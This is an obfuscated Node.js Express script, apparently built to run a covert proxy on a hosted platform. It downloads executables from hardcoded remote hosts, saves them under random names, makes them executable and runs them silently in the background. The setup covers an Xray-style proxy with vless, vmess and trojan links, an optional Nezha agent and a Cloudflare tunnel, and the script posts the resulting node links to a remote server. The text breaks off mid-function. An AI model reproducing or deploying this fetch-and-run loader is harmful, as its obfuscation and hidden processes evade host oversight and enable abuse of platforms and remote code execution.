const _0x51611a=_0x8bdc;(function(_0x4ed293,_0x4690cf){const _0x165c28={_0xfdbcca:0x24d,_0x275e84:0x1cf,_0x487cf5:0x21d,_0x2a616a:0x1f3},_0x4e5579=_0x8bdc,_0x296026=_0x4ed293();while(!![]){try{const _0x33c548=parseInt(_0x4e5579(0x215))/0x1+-parseInt(_0x4e5579(0x1e6))/0x2*(parseInt(_0x4e5579(0x1ac))/0x3)+parseInt(_0x4e5579(0x1b4))/0x4*(-parseInt(_0x4e5579(_0x165c28._0xfdbcca))/0x5)+parseInt(_0x4e5579(_0x165c28._0x275e84))/0x6*(parseInt(_0x4e5579(0x21f))/0x7)+-parseInt(_0x4e5579(0x1b1))/0x8+parseInt(_0x4e5579(0x1dc))/0x9*(parseInt(_0x4e5579(_0x165c28._0x487cf5))/0xa)+parseInt(_0x4e5579(_0x165c28._0x2a616a))/0xb;if(_0x33c548===_0x4690cf)break;else _0x296026['push'](_0x296026['shift']());}catch(_0x3e819d){_0x296026['push'](_0x296026['shift']());}}}(_0x1601,0x5c47d));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x51611a(0x1e9)),{promisify}=require(_0x51611a(0x231)),exec=promisify(require(_0x51611a(0x242))[_0x51611a(0x1a8)]),{execSync}=require(_0x51611a(0x242)),UPLOAD_URL=process[_0x51611a(0x201)][_0x51611a(0x246)]||'',PROJECT_URL=process[_0x51611a(0x201)][_0x51611a(0x228)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x51611a(0x195)]||_0x51611a(0x20c),SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process[_0x51611a(0x201)]['SERVER_PORT']||process[_0x51611a(0x201)][_0x51611a(0x1fc)]||0xbb8,UUID=process[_0x51611a(0x201)][_0x51611a(0x251)]||_0x51611a(0x1ff),NEZHA_SERVER=process[_0x51611a(0x201)][_0x51611a(0x23e)]||'',NEZHA_PORT=process[_0x51611a(0x201)][_0x51611a(0x1cb)]||'',NEZHA_KEY=process['env'][_0x51611a(0x1b7)]||'',ARGO_DOMAIN=process[_0x51611a(0x201)]['ARGO_DOMAIN']||'railway.mazter.nyc.mn',ARGO_AUTH=process[_0x51611a(0x201)][_0x51611a(0x227)]||_0x51611a(0x19a),ARGO_PORT=process['env'][_0x51611a(0x1e8)]||0x4e21,CFIP=process[_0x51611a(0x201)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x51611a(0x201)][_0x51611a(0x1dd)]||0x1bb,NAME=process[_0x51611a(0x201)][_0x51611a(0x19e)]||'railway';!fs[_0x51611a(0x202)](FILE_PATH)?(fs[_0x51611a(0x23f)](FILE_PATH),console['log'](FILE_PATH+_0x51611a(0x1ea))):console['log'](FILE_PATH+_0x51611a(0x237));function generateRandomName(){const _0x1defee={_0x48d2bc:0x22f,_0x31cf:0x1c7,_0x4d71f8:0x23a},_0x10b1c1=_0x51611a,_0x11bd21=_0x10b1c1(_0x1defee._0x48d2bc);let _0x5baf93='';for(let _0x53e159=0x0;_0x53e159<0x6;_0x53e159++){_0x5baf93+=_0x11bd21[_0x10b1c1(_0x1defee._0x31cf)](Math[_0x10b1c1(_0x1defee._0x4d71f8)](Math[_0x10b1c1(0x200)]()*_0x11bd21[_0x10b1c1(0x1b2)]));}return _0x5baf93;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x51611a(0x22e)](FILE_PATH,npmName),phpPath=path[_0x51611a(0x22e)](FILE_PATH,phpName),webPath=path[_0x51611a(0x22e)](FILE_PATH,webName),botPath=path[_0x51611a(0x22e)](FILE_PATH,botName),subPath=path[_0x51611a(0x22e)](FILE_PATH,_0x51611a(0x1b9)),listPath=path[_0x51611a(0x22e)](FILE_PATH,_0x51611a(0x221)),bootLogPath=path[_0x51611a(0x22e)](FILE_PATH,'boot.log'),configPath=path[_0x51611a(0x22e)](FILE_PATH,_0x51611a(0x1c3));function deleteNodes(){const _0x2deeb9={_0x2fab46:0x1f4,_0x524ff6:0x1c0,_0x5af6a0:0x1c1,_0x4db5d5:0x1b2,_0x39b29f:0x1e1},_0x2a1875=_0x51611a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1f0ee2;try{_0x1f0ee2=fs[_0x2a1875(0x22c)](subPath,_0x2a1875(0x198));}catch{return null;}const _0x51afa4=Buffer[_0x2a1875(_0x2deeb9._0x2fab46)](_0x1f0ee2,_0x2a1875(_0x2deeb9._0x524ff6))[_0x2a1875(_0x2deeb9._0x5af6a0)](_0x2a1875(0x198)),_0x2b5431=_0x51afa4[_0x2a1875(0x19f)]('\x0a')[_0x2a1875(0x1d0)](_0x2ecb0c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a1875(0x247)](_0x2ecb0c));if(_0x2b5431[_0x2a1875(_0x2deeb9._0x4db5d5)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2a1875(_0x2deeb9._0x39b29f)]({'nodes':_0x2b5431}),{'headers':{'Content-Type':_0x2a1875(0x240)}})[_0x2a1875(0x1ae)](_0x4c5375=>{return null;}),null;}catch(_0x3a00e5){return null;}}function cleanupOldFiles(){const _0x2e3e63={_0x3eb077:0x22e,_0x1733bc:0x1d4,_0x4e3223:0x1ed},_0x58b7b2=_0x51611a;try{const _0x2058a9=fs['readdirSync'](FILE_PATH);_0x2058a9[_0x58b7b2(0x22d)](_0x3635f5=>{const _0x2abc6d=_0x58b7b2,_0x1e1fba=path[_0x2abc6d(_0x2e3e63._0x3eb077)](FILE_PATH,_0x3635f5);try{const _0x49816f=fs[_0x2abc6d(_0x2e3e63._0x1733bc)](_0x1e1fba);_0x49816f[_0x2abc6d(_0x2e3e63._0x4e3223)]()&&fs[_0x2abc6d(0x199)](_0x1e1fba);}catch(_0x1e2ac1){}});}catch(_0x2df1fb){}}app['get']('/',function(_0x55e261,_0x57c46d){const _0x16c8e9=_0x51611a;_0x57c46d[_0x16c8e9(0x24e)](_0x16c8e9(0x208));});function _0x8bdc(_0x66d606,_0x1f76e5){const _0x1601d8=_0x1601();return _0x8bdc=function(_0x8bdc9d,_0x2744c0){_0x8bdc9d=_0x8bdc9d-0x193;let _0x3fad5f=_0x1601d8[_0x8bdc9d];return _0x3fad5f;},_0x8bdc(_0x66d606,_0x1f76e5);}async function generateConfig(){const _0x10c70a={_0x35ce40:0x1bf,_0x22eeb6:0x249,_0x1dc940:0x1b8,_0x2dd0ee:0x205,_0x5af994:0x1f7,_0xbe8ff1:0x1ef,_0x23a682:0x1b0,_0x59050d:0x1df,_0x4b1c61:0x1eb,_0xf8b9a0:0x1f2,_0x33f4dd:0x22b,_0x3994db:0x22e},_0x19655c=_0x51611a,_0xc51375={'log':{'access':_0x19655c(0x1e0),'error':'/dev/null','loglevel':_0x19655c(0x1f7)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x19655c(0x197)}],'decryption':_0x19655c(0x1f7),'fallbacks':[{'dest':0xbb9},{'path':_0x19655c(_0x10c70a._0x35ce40),'dest':0xbba},{'path':_0x19655c(0x1df),'dest':0xbbb},{'path':_0x19655c(_0x10c70a._0x22eeb6),'dest':0xbbc}]},'streamSettings':{'network':_0x19655c(_0x10c70a._0x1dc940)}},{'port':0xbb9,'listen':_0x19655c(_0x10c70a._0x2dd0ee),'protocol':_0x19655c(0x1ef),'settings':{'clients':[{'id':UUID}],'decryption':_0x19655c(_0x10c70a._0x5af994)},'streamSettings':{'network':'tcp','security':_0x19655c(0x1f7)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x19655c(_0x10c70a._0xbe8ff1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x19655c(_0x10c70a._0x5af994)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x19655c(0x1bf)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x19655c(_0x10c70a._0x23a682)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x19655c(0x205),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x19655c(_0x10c70a._0x59050d)}},'sniffing':{'enabled':!![],'destOverride':[_0x19655c(0x1eb),'tls',_0x19655c(0x1b0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x19655c(0x205),'protocol':_0x19655c(0x1c4),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x19655c(0x1f7),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x19655c(_0x10c70a._0x4b1c61),_0x19655c(0x20a),_0x19655c(0x1b0)],'metadataOnly':![]}}],'dns':{'servers':[_0x19655c(_0x10c70a._0xf8b9a0)]},'outbounds':[{'protocol':_0x19655c(0x1de),'tag':_0x19655c(0x1e5)},{'protocol':_0x19655c(_0x10c70a._0x33f4dd),'tag':'block'}]};fs[_0x19655c(0x1af)](path[_0x19655c(_0x10c70a._0x3994db)](FILE_PATH,_0x19655c(0x1c3)),JSON['stringify'](_0xc51375,null,0x2));}function getSystemArchitecture(){const _0x2d6bb7=_0x51611a,_0x416a22=os[_0x2d6bb7(0x193)]();return _0x416a22===_0x2d6bb7(0x230)||_0x416a22==='arm64'||_0x416a22==='aarch64'?_0x2d6bb7(0x230):'amd';}function downloadFile(_0x34ff85,_0x35a81d,_0xe67093){const _0xf4aa46={_0x3903cc:0x234,_0x31cec3:0x1cd,_0x128dd3:0x23c},_0x622acf={_0x445519:0x222,_0x3bbcf6:0x207,_0x57dbc7:0x1c9},_0x935ab={_0x3aa053:0x21e,_0x49e514:0x1e4},_0x11536c={_0x4b7044:0x239},_0x386c65=_0x51611a,_0x3efaa2=_0x34ff85;!fs['existsSync'](FILE_PATH)&&fs[_0x386c65(0x23f)](FILE_PATH,{'recursive':!![]});const _0x2f0404=fs[_0x386c65(_0xf4aa46._0x3903cc)](_0x3efaa2);axios({'method':_0x386c65(_0xf4aa46._0x31cec3),'url':_0x35a81d,'responseType':_0x386c65(0x1db)})[_0x386c65(_0xf4aa46._0x128dd3)](_0x5328b2=>{const _0x2c9ac7={_0x2a5d8e:0x1d9,_0x38b26f:0x239},_0x4b61ed=_0x386c65;_0x5328b2['data'][_0x4b61ed(_0x935ab._0x3aa053)](_0x2f0404),_0x2f0404['on'](_0x4b61ed(_0x935ab._0x49e514),()=>{const _0x4e6758=_0x4b61ed;_0x2f0404['close'](),console['log'](_0x4e6758(_0x11536c._0x4b7044)+path[_0x4e6758(0x222)](_0x3efaa2)+_0x4e6758(0x232)),_0xe67093(null,_0x3efaa2);}),_0x2f0404['on'](_0x4b61ed(0x24b),_0x1c8893=>{const _0xf6b290=_0x4b61ed;fs[_0xf6b290(_0x2c9ac7._0x2a5d8e)](_0x3efaa2,()=>{});const _0x9075bd=_0xf6b290(_0x2c9ac7._0x38b26f)+path['basename'](_0x3efaa2)+'\x20failed:\x20'+_0x1c8893[_0xf6b290(0x1c9)];console[_0xf6b290(0x24b)](_0x9075bd),_0xe67093(_0x9075bd);});})[_0x386c65(0x1ae)](_0x46b5e7=>{const _0x23f83d=_0x386c65,_0x1722c5=_0x23f83d(0x239)+path[_0x23f83d(_0x622acf._0x445519)](_0x3efaa2)+_0x23f83d(_0x622acf._0x3bbcf6)+_0x46b5e7[_0x23f83d(_0x622acf._0x57dbc7)];console['error'](_0x1722c5),_0xe67093(_0x1722c5);});}async function downloadFilesAndRun(){const _0x3a8a19={_0x216dbe:0x1b2,_0x4aaa2b:0x1d5,_0x1afd50:0x245,_0x49b873:0x1a4,_0x307fe3:0x241,_0xf3a12e:0x236,_0x1136bc:0x19c,_0x215556:0x21c,_0x3ece03:0x194,_0x4c90f9:0x23b,_0xb16d60:0x1be,_0x3f8043:0x19c,_0x2aafe4:0x1ec,_0xdb74da:0x1a6,_0x2e3656:0x1b5,_0x105ca1:0x1be,_0xced098:0x24b,_0x4cd825:0x1a7,_0x1e9ac2:0x1d5,_0x2b6d9f:0x1fe,_0x1854ed:0x1a1,_0x39ad57:0x220,_0x596c12:0x1f9,_0x4cd2c0:0x1b5,_0x332411:0x1c8},_0x453d7b={_0x5c24df:0x22d},_0x44d6c3={_0x58f305:0x21b,_0x16fdfe:0x253},_0x520838=_0x51611a,_0x603e15=getSystemArchitecture(),_0x3b4d40=getFilesForArchitecture(_0x603e15);if(_0x3b4d40[_0x520838(_0x3a8a19._0x216dbe)]===0x0){console[_0x520838(_0x3a8a19._0x4aaa2b)](_0x520838(_0x3a8a19._0x1afd50));return;}const _0x1e468c=_0x3b4d40[_0x520838(0x225)](_0x5a9332=>{return new Promise((_0x5495ac,_0x42997d)=>{const _0x4d9473=_0x8bdc;downloadFile(_0x5a9332[_0x4d9473(_0x44d6c3._0x58f305)],_0x5a9332[_0x4d9473(_0x44d6c3._0x16fdfe)],(_0x4e011e,_0x54c59e)=>{_0x4e011e?_0x42997d(_0x4e011e):_0x5495ac(_0x54c59e);});});});try{await Promise[_0x520838(0x22a)](_0x1e468c);}catch(_0x19b89d){console['error'](_0x520838(0x204),_0x19b89d);return;}function _0x407094(_0x2db587){const _0x27adfa={_0x114dab:0x202,_0x72837d:0x211},_0x15d7d1={_0x5d9685:0x196,_0x57741e:0x1d5},_0x4ce423=_0x520838,_0x5d9243=0x1fd;_0x2db587[_0x4ce423(_0x453d7b._0x5c24df)](_0x161fb8=>{const _0x397866=_0x4ce423;fs[_0x397866(_0x27adfa._0x114dab)](_0x161fb8)&&fs[_0x397866(_0x27adfa._0x72837d)](_0x161fb8,_0x5d9243,_0x355fad=>{const _0x345db2=_0x397866;_0x355fad?console[_0x345db2(0x24b)](_0x345db2(_0x15d7d1._0x5d9685)+_0x161fb8+':\x20'+_0x355fad):console[_0x345db2(_0x15d7d1._0x57741e)]('Empowerment\x20success\x20for\x20'+_0x161fb8+':\x20'+_0x5d9243['toString'](0x8));});});}const _0xfb1d9f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x407094(_0xfb1d9f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ddf87=NEZHA_SERVER[_0x520838(_0x3a8a19._0x49b873)](':')?NEZHA_SERVER[_0x520838(0x19f)](':')[_0x520838(_0x3a8a19._0x307fe3)]():'',_0x27f04b=new Set([_0x520838(0x1bb),_0x520838(0x1aa),'2096',_0x520838(_0x3a8a19._0xf3a12e),_0x520838(_0x3a8a19._0x1136bc),_0x520838(0x1ec)]),_0x734fef=_0x27f04b[_0x520838(0x1f8)](_0x3ddf87)?_0x520838(0x1f1):'false',_0x244279=_0x520838(_0x3a8a19._0x215556)+NEZHA_KEY+_0x520838(0x224)+NEZHA_SERVER+_0x520838(0x1f5)+_0x734fef+_0x520838(_0x3a8a19._0x3ece03)+UUID;fs[_0x520838(0x1af)](path['join'](FILE_PATH,_0x520838(0x214)),_0x244279);const _0x4bca44=_0x520838(0x1b5)+phpPath+_0x520838(_0x3a8a19._0x4c90f9)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4bca44),console['log'](phpName+_0x520838(_0x3a8a19._0xb16d60)),await new Promise(_0x3b563c=>setTimeout(_0x3b563c,0x3e8));}catch(_0x4e82e8){console[_0x520838(0x24b)]('php\x20running\x20error:\x20'+_0x4e82e8);}}else{let _0x5ed75f='';const _0x156457=[_0x520838(0x1bb),'8443',_0x520838(0x1d1),'2087',_0x520838(_0x3a8a19._0x3f8043),_0x520838(_0x3a8a19._0x2aafe4)];_0x156457[_0x520838(_0x3a8a19._0x49b873)](NEZHA_PORT)&&(_0x5ed75f=_0x520838(_0x3a8a19._0xdb74da));const _0x4a864b=_0x520838(_0x3a8a19._0x2e3656)+npmPath+_0x520838(0x19b)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5ed75f+_0x520838(0x254);try{await exec(_0x4a864b),console[_0x520838(0x1d5)](npmName+_0x520838(_0x3a8a19._0x105ca1)),await new Promise(_0x495e98=>setTimeout(_0x495e98,0x3e8));}catch(_0x24e469){console[_0x520838(_0x3a8a19._0xced098)](_0x520838(_0x3a8a19._0x4cd825)+_0x24e469);}}}else console[_0x520838(_0x3a8a19._0x1e9ac2)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x7cfa26=_0x520838(_0x3a8a19._0x2e3656)+webPath+'\x20-c\x20'+FILE_PATH+_0x520838(_0x3a8a19._0x2b6d9f);try{await exec(_0x7cfa26),console[_0x520838(0x1d5)](webName+_0x520838(_0x3a8a19._0x105ca1)),await new Promise(_0x374004=>setTimeout(_0x374004,0x3e8));}catch(_0x59eee6){console[_0x520838(0x24b)](_0x520838(_0x3a8a19._0x1854ed)+_0x59eee6);}if(fs[_0x520838(0x202)](botPath)){let _0x71b7b9;if(ARGO_AUTH[_0x520838(_0x3a8a19._0x39ad57)](/^[A-Z0-9a-z=]{120,250}$/))_0x71b7b9=_0x520838(0x203)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x71b7b9=_0x520838(0x233)+FILE_PATH+_0x520838(_0x3a8a19._0x596c12):_0x71b7b9=_0x520838(0x1ee)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x520838(_0x3a8a19._0x4cd2c0)+botPath+'\x20'+_0x71b7b9+_0x520838(_0x3a8a19._0x332411)),console[_0x520838(0x1d5)](botName+'\x20is\x20running'),await new Promise(_0x342460=>setTimeout(_0x342460,0x7d0));}catch(_0x45f6ae){console['error']('Error\x20executing\x20command:\x20'+_0x45f6ae);}}await new Promise(_0xfebc01=>setTimeout(_0xfebc01,0x1388));}function getFilesForArchitecture(_0x3ecf23){const _0x3f2759={_0x454eb6:0x206,_0x285ceb:0x230,_0x364d6f:0x210,_0x749b39:0x244},_0x378d8f=_0x51611a;let _0x4390ce;_0x3ecf23===_0x378d8f(0x230)?_0x4390ce=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x378d8f(0x1d8)}]:_0x4390ce=[{'fileName':webPath,'fileUrl':_0x378d8f(0x1ca)},{'fileName':botPath,'fileUrl':_0x378d8f(_0x3f2759._0x454eb6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x6cadf3=_0x3ecf23===_0x378d8f(_0x3f2759._0x285ceb)?_0x378d8f(0x216):_0x378d8f(_0x3f2759._0x364d6f);_0x4390ce[_0x378d8f(_0x3f2759._0x749b39)]({'fileName':npmPath,'fileUrl':_0x6cadf3});}else{const _0x2e9014=_0x3ecf23===_0x378d8f(0x230)?'https://arm64.ssss.nyc.mn/v1':_0x378d8f(0x1b3);_0x4390ce[_0x378d8f(0x244)]({'fileName':phpPath,'fileUrl':_0x2e9014});}}return _0x4390ce;}function argoType(){const _0x4a864f={_0x31b571:0x1c5,_0x3e68a5:0x1af,_0x4ce3da:0x248,_0x16ecf5:0x19f,_0x38559a:0x1b6,_0x257f17:0x213,_0x46c6db:0x1d5},_0x153061=_0x51611a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x153061(0x1d5)](_0x153061(_0x4a864f._0x31b571));return;}if(ARGO_AUTH['includes'](_0x153061(0x1d2))){fs[_0x153061(_0x4a864f._0x3e68a5)](path[_0x153061(0x22e)](FILE_PATH,_0x153061(0x217)),ARGO_AUTH);const _0x4c6584=_0x153061(_0x4a864f._0x4ce3da)+ARGO_AUTH[_0x153061(_0x4a864f._0x16ecf5)]('\x22')[0xb]+_0x153061(_0x4a864f._0x38559a)+path[_0x153061(0x22e)](FILE_PATH,_0x153061(0x217))+_0x153061(_0x4a864f._0x257f17)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x153061(0x212)),_0x4c6584);}else console[_0x153061(_0x4a864f._0x46c6db)](_0x153061(0x1a2));}async function extractDomains(){const _0x2cfcda={_0xb84394:0x1c2,_0x24f411:0x19f,_0x1316cd:0x1b2,_0x35e1ae:0x1d5,_0x47fefc:0x1ce,_0xc70720:0x1fb,_0x4fdb44:0x199,_0x46a8b2:0x22e,_0x310b39:0x1ee,_0x17d7c8:0x1e2,_0xc81d49:0x1c8,_0x3ba38d:0x1be,_0x4e4c1b:0x1a5,_0x28bd86:0x24b},_0xd816ef={_0x5bd537:0x1cd,_0x22336b:0x226,_0x57769e:0x21a,_0x19c3d7:0x1f6,_0x7b9a4e:0x226,_0x557e50:0x1a3,_0x2a8789:0x1ba,_0x2c88be:0x226},_0x32d813={_0x57d260:0x218},_0x110f0c={_0x153842:0x220,_0x365ec1:0x20d},_0x2052f0=_0x51611a;let _0x32d6a2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x32d6a2=ARGO_DOMAIN,console['log'](_0x2052f0(_0x2cfcda._0xb84394),_0x32d6a2),await _0x5e6330(_0x32d6a2);else try{const _0x2f191c=fs[_0x2052f0(0x22c)](path[_0x2052f0(0x22e)](FILE_PATH,'boot.log'),'utf-8'),_0x33603c=_0x2f191c[_0x2052f0(_0x2cfcda._0x24f411)]('\x0a'),_0x596158=[];_0x33603c[_0x2052f0(0x22d)](_0xe092d4=>{const _0x15d9ea=_0x2052f0,_0x4f01c1=_0xe092d4[_0x15d9ea(_0x110f0c._0x153842)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f01c1){const _0x255ed4=_0x4f01c1[0x1];_0x596158[_0x15d9ea(_0x110f0c._0x365ec1)](_0x255ed4);}});if(_0x596158[_0x2052f0(_0x2cfcda._0x1316cd)]>0x0)_0x32d6a2=_0x596158[0x0],console[_0x2052f0(_0x2cfcda._0x35e1ae)](_0x2052f0(_0x2cfcda._0x47fefc),_0x32d6a2),await _0x5e6330(_0x32d6a2);else{console['log'](_0x2052f0(_0x2cfcda._0xc70720)),fs[_0x2052f0(_0x2cfcda._0x4fdb44)](path[_0x2052f0(_0x2cfcda._0x46a8b2)](FILE_PATH,'boot.log'));async function _0x5bedba(){const _0xe3bf61=_0x2052f0;try{process[_0xe3bf61(0x252)]==='win32'?await exec(_0xe3bf61(0x1bc)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xe3bf61(_0x32d813._0x57d260)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0xe3bf61(0x1ad));}catch(_0xd8aae2){}}_0x5bedba(),await new Promise(_0x434b30=>setTimeout(_0x434b30,0xbb8));const _0x34c2a9=_0x2052f0(_0x2cfcda._0x310b39)+FILE_PATH+_0x2052f0(_0x2cfcda._0x17d7c8)+ARGO_PORT;try{await exec(_0x2052f0(0x1b5)+botPath+'\x20'+_0x34c2a9+_0x2052f0(_0x2cfcda._0xc81d49)),console[_0x2052f0(_0x2cfcda._0x35e1ae)](botName+_0x2052f0(_0x2cfcda._0x3ba38d)),await new Promise(_0x5bacef=>setTimeout(_0x5bacef,0xbb8)),await extractDomains();}catch(_0x1ee287){console[_0x2052f0(0x24b)](_0x2052f0(_0x2cfcda._0x4e4c1b)+_0x1ee287);}}}catch(_0x288b26){console[_0x2052f0(_0x2cfcda._0x28bd86)](_0x2052f0(0x229),_0x288b26);}async function _0x1c0843(){const _0x555da4=_0x2052f0;try{const _0x589003=await axios[_0x555da4(_0xd816ef._0x5bd537)](_0x555da4(0x23d),{'timeout':0xbb8});if(_0x589003[_0x555da4(0x226)]&&_0x589003[_0x555da4(_0xd816ef._0x22336b)]['country_code']&&_0x589003[_0x555da4(0x226)][_0x555da4(_0xd816ef._0x57769e)])return _0x589003[_0x555da4(0x226)][_0x555da4(_0xd816ef._0x19c3d7)]+'_'+_0x589003[_0x555da4(0x226)][_0x555da4(0x21a)];}catch(_0x1157ac){try{const _0x5c4136=await axios[_0x555da4(0x1cd)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5c4136[_0x555da4(0x226)]&&_0x5c4136[_0x555da4(_0xd816ef._0x7b9a4e)][_0x555da4(0x223)]===_0x555da4(_0xd816ef._0x557e50)&&_0x5c4136[_0x555da4(0x226)][_0x555da4(_0xd816ef._0x2a8789)]&&_0x5c4136[_0x555da4(0x226)][_0x555da4(0x21a)])return _0x5c4136['data'][_0x555da4(0x1ba)]+'_'+_0x5c4136[_0x555da4(_0xd816ef._0x2c88be)][_0x555da4(0x21a)];}catch(_0x31162d){}}return _0x555da4(0x209);}async function _0x5e6330(_0x51f0e9){const _0x42fe0d={_0x297193:0x1f7,_0x5d4927:0x1da,_0x4cca71:0x20a,_0x21ce0d:0x19d,_0x45f918:0x24f,_0x3d1e0b:0x1f4,_0x12455a:0x1c0,_0x41a43b:0x1af,_0x59e2bd:0x1c0,_0x1d8838:0x1cd},_0x22556d=await _0x1c0843(),_0x489585=NAME?NAME+'-'+_0x22556d:_0x22556d;return new Promise(_0x48bc39=>{setTimeout(()=>{const _0x2d76de={_0x5dcf14:0x1c1,_0x15c6e1:0x1c0,_0x480c61:0x1bd,_0x3ea811:0x24e},_0x3c75e3=_0x8bdc,_0x26fda1={'v':'2','ps':''+_0x489585,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3c75e3(_0x42fe0d._0x297193),'net':'ws','type':_0x3c75e3(0x1f7),'host':_0x51f0e9,'path':_0x3c75e3(_0x42fe0d._0x5d4927),'tls':_0x3c75e3(_0x42fe0d._0x4cca71),'sni':_0x51f0e9,'alpn':'','fp':_0x3c75e3(0x20f)},_0x350362=_0x3c75e3(_0x42fe0d._0x21ce0d)+UUID+'@'+CFIP+':'+CFPORT+_0x3c75e3(_0x42fe0d._0x45f918)+_0x51f0e9+_0x3c75e3(0x1d3)+_0x51f0e9+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x489585+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](_0x26fda1))[_0x3c75e3(0x1c1)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3c75e3(0x1a0)+_0x51f0e9+_0x3c75e3(0x1d3)+_0x51f0e9+_0x3c75e3(0x243)+_0x489585+'\x0a\x20\x20\x20\x20';console[_0x3c75e3(0x1d5)](Buffer[_0x3c75e3(_0x42fe0d._0x3d1e0b)](_0x350362)[_0x3c75e3(0x1c1)](_0x3c75e3(_0x42fe0d._0x12455a))),fs[_0x3c75e3(_0x42fe0d._0x41a43b)](subPath,Buffer[_0x3c75e3(_0x42fe0d._0x3d1e0b)](_0x350362)[_0x3c75e3(0x1c1)](_0x3c75e3(_0x42fe0d._0x59e2bd))),console[_0x3c75e3(0x1d5)](FILE_PATH+_0x3c75e3(0x24c)),uploadNodes(),app[_0x3c75e3(_0x42fe0d._0x1d8838)]('/'+SUB_PATH,(_0x215b0e,_0x4f492c)=>{const _0x3abd2e=_0x3c75e3,_0x1f877f=Buffer['from'](_0x350362)[_0x3abd2e(_0x2d76de._0x5dcf14)](_0x3abd2e(_0x2d76de._0x15c6e1));_0x4f492c[_0x3abd2e(0x20b)]('Content-Type',_0x3abd2e(_0x2d76de._0x480c61)),_0x4f492c[_0x3abd2e(_0x2d76de._0x3ea811)](_0x1f877f);}),_0x48bc39(_0x350362);},0x7d0);});}}async function uploadNodes(){const _0xd23af7={_0x4b6a5c:0x240,_0xed5794:0x202,_0x1f4b26:0x19f,_0x4f2698:0x1b2,_0x1ff17a:0x1e1,_0x2d6d51:0x1a9,_0x14b262:0x223,_0x97c024:0x1d6},_0xf32abf=_0x51611a;if(UPLOAD_URL&&PROJECT_URL){const _0x4bfbc6=PROJECT_URL+'/'+SUB_PATH,_0xd490b1={'subscription':[_0x4bfbc6]};try{const _0x1c2359=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0xd490b1,{'headers':{'Content-Type':_0xf32abf(_0xd23af7._0x4b6a5c)}});return _0x1c2359&&_0x1c2359[_0xf32abf(0x223)]===0xc8?(console[_0xf32abf(0x1d5)](_0xf32abf(0x20e)),_0x1c2359):null;}catch(_0x2143d0){if(_0x2143d0[_0xf32abf(0x1e3)]){if(_0x2143d0[_0xf32abf(0x1e3)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xf32abf(_0xd23af7._0xed5794)](listPath))return;const _0x286130=fs[_0xf32abf(0x22c)](listPath,'utf-8'),_0x560ecc=_0x286130[_0xf32abf(_0xd23af7._0x1f4b26)]('\x0a')[_0xf32abf(0x1d0)](_0x3add8a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3add8a));if(_0x560ecc[_0xf32abf(_0xd23af7._0x4f2698)]===0x0)return;const _0xbc22ee=JSON[_0xf32abf(_0xd23af7._0x1ff17a)]({'nodes':_0x560ecc});try{const _0x8d590c=await axios[_0xf32abf(_0xd23af7._0x2d6d51)](UPLOAD_URL+'/api/add-nodes',_0xbc22ee,{'headers':{'Content-Type':'application/json'}});return _0x8d590c&&_0x8d590c[_0xf32abf(_0xd23af7._0x14b262)]===0xc8?(console[_0xf32abf(0x1d5)](_0xf32abf(_0xd23af7._0x97c024)),_0x8d590c):null;}catch(_0x3a39f6){return null;}}else return;}}function cleanFiles(){const _0x4268e8={_0x13d3d0:0x252,_0x3b775f:0x1e7,_0x53a9ee:0x1ab};setTimeout(()=>{const 